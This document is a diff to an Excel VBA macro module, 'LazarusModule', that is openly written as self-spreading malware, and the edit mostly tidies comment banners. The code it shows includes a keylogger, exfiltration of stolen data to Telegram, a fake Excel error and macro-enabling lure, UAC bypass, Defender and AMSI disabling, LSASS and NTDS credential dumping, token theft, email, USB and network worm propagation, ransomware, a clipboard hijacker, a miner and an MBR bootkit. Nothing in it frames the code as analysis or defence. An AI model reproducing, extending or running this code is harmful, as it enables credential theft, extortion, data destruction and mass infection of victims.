@@ -1,9 +1,9 @@
 Attribute VB_Name = "LazarusModule"
 Option Explicit
 
-' -----------------------------------------------------------------
-' 1. UNIVERSAL API DECLARATIONS (32‑bit + 64‑bit)
-' -----------------------------------------------------------------
+' ============================================================
+' 1. UNIVERSAL API DECLARATIONS (32-bit + 64-bit)
+' ============================================================
 #If VBA7 Then
     Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
     Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)
@@ -75,9 +75,8 @@ Option Explicit
     Private pGlobalHeap As LongPtr
     Private pGlobalLock As LongPtr
     Private hWatchdogTimer As LongPtr
-    Private pWatchdogHeap As LongPtr
 #Else
-    ' 32‑bit declarations (Office 2010 and older)
+    ' 32‑bit declarations - Office 2010/2013 etc.
     Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
     Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
     Private Declare Sub ZeroMemory Lib "ntdll.dll" Alias "RtlZeroMemory" (ByVal Destination As Long, ByVal Length As Long)
@@ -147,17 +146,15 @@ Option Explicit
     Private pGlobalHeap As Long
     Private pGlobalLock As Long
     Private hWatchdogTimer As Long
-    Private pWatchdogHeap As Long
 #End If
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 2. CONSTANTS & TYPES
-' -----------------------------------------------------------------
+' ============================================================
 Private Const WT_EXECUTEDEFAULT As Long = &H0
 Private Const GMEM_FIXED As Long = &H0
 Private Const KEYLOGGER_RESOLUTION As Long = 10
 Private Const ENGINE_RESOLUTION As Long = 500
-Private Const WATCHDOG_RESOLUTION As Long = 2000
 Private Const PROV_RSA_FULL As Long = 1
 Private Const CRYPT_VERIFYCONTEXT As Long = &HF0000000
 Private Const CRYPT_SILENT As Long = &H40
@@ -281,9 +278,9 @@ Private m_OriginalPerformance(3) As Variant
 Private g_needRestart As Boolean
 Private g_needRePersist As Boolean
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 3. UTILITIES WITH RETRY & ERROR LOGGING
-' -----------------------------------------------------------------
+' ============================================================
 Function GetTempDir() As String
     GetTempDir = Environ("TEMP")
     If Right(GetTempDir, 1) <> "\" Then GetTempDir = GetTempDir & "\"
@@ -412,9 +409,9 @@ Sub LogErrorToTelegram(procName As String, errDesc As String, errNum As Long)
     SendToTelegram "ERROR|" & procName & "|" & errDesc & "|Num:" & errNum
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 4. PERSISTENT LAUNCHER (VBS + Startup)
-' -----------------------------------------------------------------
+' ============================================================
 Sub InstallPersistentLauncher()
     On Error GoTo errHandler
     Dim vbsPath As String: vbsPath = Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\LazarusLauncher.vbs"
@@ -443,14 +440,13 @@ errHandler:
     LogErrorToTelegram "InstallPersistentLauncher", Err.Description, Err.Number
 End Sub
 
-' -----------------------------------------------------------------
-' 5. SOCIAL ENGINEERING (Unavoidable fake error + button + HTA)
-' -----------------------------------------------------------------
+' ============================================================
+' 5. SOCIAL ENGINEERING (Fake error + button + HTA)
+' ============================================================
 Sub ShowFakeError()
     On Error Resume Next
-    Dim response As VbMsgBoxResult
-    response = MsgBox("Microsoft Excel has encountered a problem and needs to close. We apologise for the inconvenience." & vbCrLf & vbCrLf & _
-                      "Error code: 0x80070643" & vbCrLf & "Source: Excel.Application", vbCritical + vbOKOnly, "Microsoft Excel")
+    MsgBox "Microsoft Excel has encountered a problem and needs to close. We apologise for the inconvenience." & vbCrLf & vbCrLf & _
+           "Error code: 0x80070643" & vbCrLf & "Source: Excel.Application", vbCritical + vbOKOnly, "Microsoft Excel"
 End Sub
 
 Sub CreateEnableMacrosButton()
@@ -473,11 +469,6 @@ Sub CreateEnableMacrosButton()
     ws.Range("A1").Interior.Color = RGB(255, 255, 0)
     ws.Range("A2").Value = "If you do not enable macros, you will not see the contents of this document."
     ws.Range("A2").Font.Italic = True
-    ws.Range("A3").Value = "Your document is loading. Please wait..."
-    ws.Range("A3").Font.Color = RGB(0, 0, 255)
-    On Error Resume Next
-    ws.Shapes(btn.Name).ZOrder msoBringToFront
-    ws.Shapes(btn.Name).Visible = msoTrue
 End Sub
 
 Public Sub EnableMacrosViaHTA()
@@ -543,9 +534,9 @@ Sub DeploySocialEngineeringUI()
     CreateObject("WScript.Shell").Run "mshta.exe """ & uiPath & """", 0, False
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 6. ENCODING & TELEGRAM
-' -----------------------------------------------------------------
+' ============================================================
 Function EncodeBase64(data() As Byte) As String
     On Error Resume Next
     Dim xml As Object: Set xml = CreateObject("MSXML2.DOMDocument.3.0").createElement("tmp")
@@ -582,9 +573,9 @@ Sub SendToTelegramChunked(msg As String)
     Next i
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 7. HIGH-SPEED ASYNC KEYLOGGER (Thread‑safe)
-' -----------------------------------------------------------------
+' ============================================================
 Private Sub EnterLock(ByVal pLock As LongPtr)
     Dim lockVal As Long
     Do
@@ -659,9 +650,9 @@ Function GetKeyName(vKey As Integer) As String
     End Select
 End Function
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 8. EVASION & SANDBOX (with EDR checks)
-' -----------------------------------------------------------------
+' ============================================================
 Function IsSandbox() As Boolean
     On Error Resume Next
 #If Win64 Then
@@ -777,9 +768,9 @@ Sub DisableRecovery()
     wsh.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Disabled", 1, "REG_DWORD"
 End Sub
 
-' -----------------------------------------------------------------
-' 9. UAC BYPASS (6 methods) – Fixed RegDeleteTreeA
-' -----------------------------------------------------------------
+' ============================================================
+' 9. UAC BYPASS (6 methods)
+' ============================================================
 Sub UACBypass_Fodhelper(): On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute", "", "REG_SZ"
@@ -823,9 +814,9 @@ Sub ElevatePrivileges()
     UACBypass_ComputerDefaults
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 10. DOMAIN CONTROLLER ATTACK
-' -----------------------------------------------------------------
+' ============================================================
 Function IsDomainController() As Boolean
     On Error Resume Next: If Not IsUserAdmin() Then Exit Function
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell"): wsh.RegRead "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
@@ -878,9 +869,9 @@ Sub ExtractHashesFromNTDS()
     End If: fso.DeleteFile ntdsPath: fso.DeleteFile systemPath
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 11. CREDENTIAL THEFT (Full coverage)
-' -----------------------------------------------------------------
+' ============================================================
 Sub DumpLSASS()
     On Error Resume Next: If Not IsUserAdmin() Then Exit Sub
     Dim pid As Long: Dim snap As LongPtr: snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
@@ -1023,9 +1014,9 @@ End Sub
 
 Private Sub ExtractAllCredentials(): ExtractCredentialsFromKeylog: End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 12. HARVEST EMAIL TARGETS
-' -----------------------------------------------------------------
+' ============================================================
 Private Sub HarvestFromOutlookContacts()
     On Error Resume Next: Dim outlookApp As Object: Set outlookApp = GetObject(, "Outlook.Application")
     If outlookApp Is Nothing Then Set outlookApp = CreateObject("Outlook.Application")
@@ -1086,9 +1077,9 @@ Private Sub HarvestAllEmailTargets()
     SendToTelegram "EMAIL_TARGETS_HARVESTED|COUNT=" & g_emailTargets.Count
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 13. EMAIL PROPAGATION (5 methods)
-' -----------------------------------------------------------------
+' ============================================================
 Private Function SendEmailViaSendGrid(toAddr As String, attachmentPath As String) As Boolean
     On Error GoTo Fail: Dim apiKey As String: apiKey = Environ("SENDGRID_API_KEY")
     If apiKey = "" Then
@@ -1177,9 +1168,9 @@ Private Sub WildfireEmailPropagation()
     Next target: SendToTelegram "WILDFIRE_EMAIL_DONE|SENT=" & sentCount & "|TOTAL_TARGETS=" & g_emailTargets.Count
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 14. DISCORD & SLACK TOKEN THEFT & PROPAGATION
-' -----------------------------------------------------------------
+' ============================================================
 Private Sub DiscordPropagation()
     On Error Resume Next
     Dim appData As String: appData = Environ("APPDATA")
@@ -1286,9 +1277,9 @@ Private Sub SlackPropagation()
     End If
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 15. RANSOMWARE (AES-GCM)
-' -----------------------------------------------------------------
+' ============================================================
 Sub GenerateMasterKey()
     On Error Resume Next: Dim hProv As LongPtr
     If CryptAcquireContextA(hProv, vbNullString, vbNullString, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT Or CRYPT_SILENT) Then
@@ -1374,9 +1365,9 @@ Sub RunRansomware()
     CreateObject("WScript.Shell").Run "notepad.exe """ & notePath & """", 1, False: SendToTelegram "RANSOMWARE|ENCRYPTION_COMPLETE"
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 16. CLIPBOARD HIJACK
-' -----------------------------------------------------------------
+' ============================================================
 Public Sub ClipboardMonitorLoop()
     On Error Resume Next: Dim text As String: Static lastText As String
     If OpenClipboard(0) Then
@@ -1423,9 +1414,9 @@ Sub SetClipboardContent(txt As String)
     End If: CloseClipboard
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 17. PROPAGATION (USB, SMB, NETWORK DRIVES, CLOUD, WMI)
-' -----------------------------------------------------------------
+' ============================================================
 Sub USBPropagation()
     On Error Resume Next: Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): If Not fso.FileExists(gSelfPath) Then Exit Sub
     Dim copiedAny As Boolean: copiedAny = False: Dim d As Object
@@ -1609,9 +1600,9 @@ Private Sub AutoUpdate()
     End If
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 18. CHROME REMOTE DESKTOP & MINER
-' -----------------------------------------------------------------
+' ============================================================
 Sub EnableChromeRemoteDesktop()
     On Error Resume Next: Dim crdPath As String: crdPath = Environ("ProgramFiles") & "\Google\Chrome Remote Desktop\chromoting.exe"
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
@@ -1655,9 +1646,9 @@ Sub DeployMiner()
     Next: SendToTelegram "MINER_FAILED"
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 19. PERSISTENCE (STANDARD + ADVANCED)
-' -----------------------------------------------------------------
+' ============================================================
 Sub InstallPermanentCopy()
     On Error Resume Next: Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): Dim hiddenPath As String: hiddenPath = Environ("PROGRAMDATA") & "\Lazarus\"
     If Not fso.FolderExists(hiddenPath) Then fso.CreateFolder hiddenPath: SetAttr hiddenPath, vbHidden + vbSystem
@@ -1695,9 +1686,9 @@ Sub PersistStartupFolder()
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): fso.CopyFile gSelfPath, startupPath & "Lazarus.xlsm", True
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 20. ADVANCED PERSISTENCE: MBR BOOTKIT & UEFI
-' -----------------------------------------------------------------
+' ============================================================
 Private Sub BackupMBRToSector1()
     On Error Resume Next: Dim hDisk As LongPtr: hDisk = CreateFileA("\\.\PhysicalDrive0", &H80000000 Or &H40000000, 1, 0, 3, 0, 0)
     If hDisk = INVALID_HANDLE_VALUE Then SendToTelegram "MBR_BOOTKIT|FAILED|Could not open PhysicalDrive0 for backup.": Exit Sub
@@ -1794,23 +1785,21 @@ Sub PersistAll()
     If Not IsEDRPresent() And IsUserAdmin() Then PersistViaUEFI: InstallMBRBootkit: InjectIntoProcess
 End Sub
 
-' -----------------------------------------------------------------
-' 21. WATCHDOG – SAFE (Kernel timer sets flags, OnTime does the work)
-' -----------------------------------------------------------------
+' ============================================================
+' 21. SAFE WATCHDOG (Flags + Main Thread)
+' ============================================================
 Private Sub Watchdog_Callback(ByVal lpParam As LongPtr, ByVal TimerOrWaitFired As Byte)
-    ' Runs on a background thread – do NOT touch Excel objects here.
     On Error Resume Next
     Static cycle As Long
     cycle = cycle + 1
-    If cycle Mod 60 = 0 Then g_needRePersist = True   ' every ~1 minute
-    g_needRestart = True    ' let main thread decide if restart is needed
+    If cycle Mod 60 = 0 Then g_needRePersist = True
+    g_needRestart = True
 End Sub
 
 Private Sub StartWatchdog()
     If hWatchdogTimer = 0 Then
         CreateTimerQueueTimer hWatchdogTimer, 0, AddressOf Watchdog_Callback, 0, 1000, 1000, WT_EXECUTEDEFAULT
     End If
-    ' Also start a main‑thread watchdog to check the flags
     Application.OnTime Now + TimeValue("00:00:05"), "MainThreadWatchdog"
 End Sub
 
@@ -1818,7 +1807,6 @@ Public Sub MainThreadWatchdog()
     On Error Resume Next
     If g_needRestart Then
         g_needRestart = False
-        ' Check if the workbook is still open
         Dim wb As Workbook
         Dim found As Boolean
         For Each wb In Application.Workbooks
@@ -1842,9 +1830,9 @@ Private Sub StopWatchdog()
     End If
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 22. ASYNCHRONOUS ENGINE (Synapse Heartbeat)
-' -----------------------------------------------------------------
+' ============================================================
 Private Sub ToggleStealthMode(ByVal Active As Boolean)
     With Application
         If Not Active Then
@@ -1927,9 +1915,9 @@ Public Sub FastKernelScan(folderPath As String)
     SendToTelegram "KERNEL_SCAN|Folder=" & folderPath & "|Files=" & fileCount
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 23. CISCO ANYCONNECT HIJACK
-' -----------------------------------------------------------------
+' ============================================================
 Private Sub HijackCisco()
     On Error Resume Next
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
@@ -1999,9 +1987,9 @@ Private Sub HijackCisco()
     End If
 End Sub
 
-' -----------------------------------------------------------------
+' ============================================================
 ' 24. MAIN ENTRY POINT (FULL AUTO WORM)
-' -----------------------------------------------------------------
+' ============================================================
 Public Sub AutoExec()
     On Error GoTo ErrorHandler
     Set g_stolenCredentials = New Collection: Set g_emailTargets = New Collection
@@ -2030,7 +2018,6 @@ Public Sub AutoExec()
         CreateEnableMacrosButton
     End If
     If IsSandbox() Then SendToTelegram "SANDBOX_DETECTED|MACHINE=" & GetMachineID(): Exit Sub
-    ' Show fake error – user cannot cancel
     ShowFakeError
     PatchAMSI: KillETW: DisableDefender: DisableRecovery: ElevatePrivileges: GenerateMasterKey
     SendToTelegram "LAZARUS_START|MACHINE=" & GetMachineID()
